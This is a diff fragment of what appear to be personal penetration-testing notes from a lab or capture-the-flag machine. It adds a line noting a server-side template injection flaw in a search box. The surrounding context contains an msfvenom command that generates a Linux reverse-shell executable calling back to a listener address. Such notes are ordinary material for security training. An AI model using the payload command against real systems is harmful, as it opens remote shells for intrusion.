@@ -29,6 +29,7 @@ PORT     STATE SERVICE    VERSION
 
 GOT TWO USERNAMES :
 
+got SSTI vulnerability in search box!
 
 generate payload using msfvenom:
         msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=334 -f elf > rev1.elf
